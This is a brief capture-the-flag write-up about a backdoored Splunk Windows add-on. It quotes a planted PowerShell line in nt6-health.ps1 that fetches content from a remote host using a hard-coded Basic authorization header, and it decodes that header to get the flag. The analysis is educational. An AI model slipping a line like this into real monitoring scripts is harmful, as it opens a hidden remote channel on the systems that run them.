# Backdoored Splunk
## You've probably seen Splunk being used for good, but have you seen it used for evil?

A website is accessible and a file is included with the challenge.

---

Browsing the website we are immediatly stopped with a "Missing authorization header". 

![Alt text](image.png)


When searching on the file I could find a base64 String that looks like our missing authorization header.

`$ grep -r "Authorization" Splunk_TA_windows/`

`Splunk_TA_windows/bin/powershell/nt6-health.ps1:$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content`


Decoding the Base64 gives us the flag